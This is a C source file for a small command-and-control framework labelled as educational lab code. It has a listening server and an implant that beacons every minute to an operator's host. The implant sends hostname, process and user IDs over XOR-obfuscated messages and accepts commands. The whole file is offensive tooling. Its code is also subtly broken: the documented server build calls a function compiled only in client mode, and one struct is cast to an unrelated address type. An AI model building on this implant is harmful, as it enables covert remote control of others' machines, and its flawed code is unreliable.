/**
 * C2 Mini Framework - C Implementation
 * Educational purpose only - Lab environment use
 * 
 * Compile: 
 * Server: gcc -o c2_server c2_framework.c -lcrypto -lpthread
 * Client: gcc -o c2_client c2_framework.c -lcrypto -lpthread -DCLIENT_MODE
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define MAX_BUFFER 4096
#define MAX_CLIENTS 100
#define BEACON_INTERVAL 60

typedef struct {
    int socket;
    struct sockaddr_in address;
    char client_id[32];
    time_t last_seen;
    char system_info[256];
} client_info_t;

typedef struct {
    char type[32];
    char client_id[32];
    char command[64];
    char args[256];
    char output[1024];
    time_t timestamp;
} c2_message_t;

// Global variables
client_info_t clients[MAX_CLIENTS];
int client_count = 0;
pthread_mutex_t clients_mutex = PTHREAD_MUTEX_INITIALIZER;
char encryption_key[32];

// Simple XOR encryption (for demonstration - use proper crypto in production)
void xor_encrypt_decrypt(char *data, size_t data_len, const char *key, size_t key_len) {
    for(size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

void generate_client_id(char *buffer, size_t len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(size_t i = 0; i < len - 1; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        buffer[i] = charset[key];
    }
    buffer[len - 1] = '\0';
}

void serialize_message(const c2_message_t *msg, char *buffer, size_t buffer_len) {
    snprintf(buffer, buffer_len, "%s|%s|%s|%s|%s|%ld",
             msg->type, msg->client_id, msg->command, msg->args, 
             msg->output, msg->timestamp);
}

void deserialize_message(const char *buffer, c2_message_t *msg) {
    sscanf(buffer, "%31[^|]|%31[^|]|%63[^|]|%255[^|]|%1023[^|]|%ld",
           msg->type, msg->client_id, msg->command, msg->args, 
           msg->output, &msg->timestamp);
}

int send_encrypted_message(int sock, const c2_message_t *msg, const char *key) {
    char buffer[MAX_BUFFER];
    char encrypted[MAX_BUFFER];
    
    serialize_message(msg, buffer, sizeof(buffer));
    size_t data_len = strlen(buffer);
    
    // Copy and encrypt
    memcpy(encrypted, buffer, data_len + 1);
    xor_encrypt_decrypt(encrypted, data_len, key, strlen(key));
    
    // Send length first
    uint32_t net_len = htonl(data_len);
    if(send(sock, &net_len, sizeof(net_len), 0) != sizeof(net_len)) {
        return -1;
    }
    
    // Send encrypted data
    if(send(sock, encrypted, data_len, 0) != data_len) {
        return -1;
    }
    
    return 0;
}

int receive_encrypted_message(int sock, c2_message_t *msg, const char *key) {
    uint32_t net_len;
    char buffer[MAX_BUFFER];
    char decrypted[MAX_BUFFER];
    
    // Receive length first
    if(recv(sock, &net_len, sizeof(net_len), 0) != sizeof(net_len)) {
        return -1;
    }
    
    size_t data_len = ntohl(net_len);
    if(data_len >= MAX_BUFFER) {
        return -1;
    }
    
    // Receive encrypted data
    ssize_t received = recv(sock, buffer, data_len, 0);
    if(received != data_len) {
        return -1;
    }
    
    // Decrypt
    memcpy(decrypted, buffer, data_len);
    decrypted[data_len] = '\0';
    xor_encrypt_decrypt(decrypted, data_len, key, strlen(key));
    
    deserialize_message(decrypted, msg);
    return 0;
}

void *handle_client(void *arg) {
    int client_sock = *(int*)arg;
    free(arg);
    
    c2_message_t msg;
    char client_id[32];
    
    // Receive initial message
    if(receive_encrypted_message(client_sock, &msg, encryption_key) == 0) {
        printf("[+] New connection from client: %s\n", msg.client_id);
        strncpy(client_id, msg.client_id, sizeof(client_id));
        
        // Add client to list
        pthread_mutex_lock(&clients_mutex);
        if(client_count < MAX_CLIENTS) {
            clients[client_count].socket = client_sock;
            clients[client_count].address = *(struct sockaddr_in*)&msg; // Simplified
            strncpy(clients[client_count].client_id, client_id, 32);
            clients[client_count].last_seen = time(NULL);
            strncpy(clients[client_count].system_info, msg.output, 256);
            client_count++;
        }
        pthread_mutex_unlock(&clients_mutex);
        
        // Process messages from client
        while(1) {
            if(receive_encrypted_message(client_sock, &msg, encryption_key) != 0) {
                break;
            }
            
            printf("[*] Received from %s: %s\n", msg.client_id, msg.type);
            
            // Update last seen
            pthread_mutex_lock(&clients_mutex);
            for(int i = 0; i < client_count; i++) {
                if(strcmp(clients[i].client_id, msg.client_id) == 0) {
                    clients[i].last_seen = time(NULL);
                    break;
                }
            }
            pthread_mutex_unlock(&clients_mutex);
            
            // Send response
            c2_message_t response;
            strcpy(response.type, "command");
            strcpy(response.client_id, msg.client_id);
            strcpy(response.command, "idle"); // Simple response
            strcpy(response.args, "");
            strcpy(response.output, "");
            response.timestamp = time(NULL);
            
            send_encrypted_message(client_sock, &response, encryption_key);
        }
    }
    
    // Remove client from list
    pthread_mutex_lock(&clients_mutex);
    for(int i = 0; i < client_count; i++) {
        if(strcmp(clients[i].client_id, client_id) == 0) {
            // Shift remaining clients
            for(int j = i; j < client_count - 1; j++) {
                clients[j] = clients[j + 1];
            }
            client_count--;
            break;
        }
    }
    pthread_mutex_unlock(&clients_mutex);
    
    close(client_sock);
    printf("[-] Client %s disconnected\n", client_id);
    return NULL;
}

void start_server(int port) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(server_sock < 0) {
        perror("[-] Socket creation failed");
        return;
    }
    
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    
    if(bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Bind failed");
        close(server_sock);
        return;
    }
    
    if(listen(server_sock, 5) < 0) {
        perror("[-] Listen failed");
        close(server_sock);
        return;
    }
    
    printf("[*] C2 Server listening on port %d\n", port);
    printf("[*] Encryption key: %s\n", encryption_key);
    
    while(1) {
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
        if(client_sock < 0) {
            perror("[-] Accept failed");
            continue;
        }
        
        int *new_sock = malloc(sizeof(int));
        *new_sock = client_sock;
        
        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_client, new_sock);
        pthread_detach(client_thread);
    }
    
    close(server_sock);
}

#ifdef CLIENT_MODE

void get_system_info(char *buffer, size_t len) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    
    snprintf(buffer, len, "Host: %s, PID: %d, User: %d", 
             hostname, getpid(), getuid());
}

int beacon_to_server(const char *server_host, int port) {
    int sock;
    struct sockaddr_in server_addr;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        perror("[-] Socket creation failed");
        return -1;
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if(inet_pton(AF_INET, server_host, &server_addr.sin_addr) <= 0) {
        perror("[-] Invalid address");
        close(sock);
        return -1;
    }
    
    if(connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Connection failed");
        close(sock);
        return -1;
    }
    
    // Send checkin message
    c2_message_t checkin;
    char client_id[32];
    generate_client_id(client_id, sizeof(client_id));
    
    strcpy(checkin.type, "checkin");
    strcpy(checkin.client_id, client_id);
    strcpy(checkin.command, "");
    strcpy(checkin.args, "");
    get_system_info(checkin.output, sizeof(checkin.output));
    checkin.timestamp = time(NULL);
    
    if(send_encrypted_message(sock, &checkin, encryption_key) != 0) {
        close(sock);
        return -1;
    }
    
    // Receive command
    c2_message_t response;
    if(receive_encrypted_message(sock, &response, encryption_key) == 0) {
        printf("[*] Received command: %s\n", response.command);
        
        // Execute command (simplified)
        if(strcmp(response.command, "system_info") == 0) {
            c2_message_t result;
            strcpy(result.type, "result");
            strcpy(result.client_id, client_id);
            strcpy(result.command, response.command);
            strcpy(result.args, "");
            get_system_info(result.output, sizeof(result.output));
            result.timestamp = time(NULL);
            
            send_encrypted_message(sock, &result, encryption_key);
        }
    }
    
    close(sock);
    return 0;
}

void start_client(const char *server_host, int port) {
    printf("[*] C2 Client starting...\n");
    printf("[*] Server: %s:%d\n", server_host, port);
    printf("[*] Encryption key: %s\n", encryption_key);
    
    while(1) {
        if(beacon_to_server(server_host, port) == 0) {
            printf("[+] Beacon successful\n");
        } else {
            printf("[-] Beacon failed\n");
        }
        
        sleep(BEACON_INTERVAL);
    }
}

#endif

int main(int argc, char *argv[]) {
    int port = 4444;
    char *server_host = NULL;
    int mode = 0; // 0 = server, 1 = client
    
    // Simple argument parsing
    for(int i = 1; i < argc; i++) {
        if(strcmp(argv[i], "--server") == 0) {
            mode = 0;
        } else if(strcmp(argv[i], "--client") == 0) {
            mode = 1;
            if(i + 1 < argc) {
                server_host = argv[++i];
            }
        } else if(strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            port = atoi(argv[++i]);
        }
    }
    
    // Initialize encryption key
    strcpy(encryption_key, "changeme123");
    
    srand(time(NULL));
    
    if(mode == 0) {
        // Server mode
        printf("[*] Starting C2 Server...\n");
        start_server(port);
    } else {
        // Client mode
        if(!server_host) {
            printf("Usage: %s --client <server_host> [--port <port>]\n", argv[0]);
            return 1;
        }
        start_client(server_host, port);
    }
    
    return 0;
}
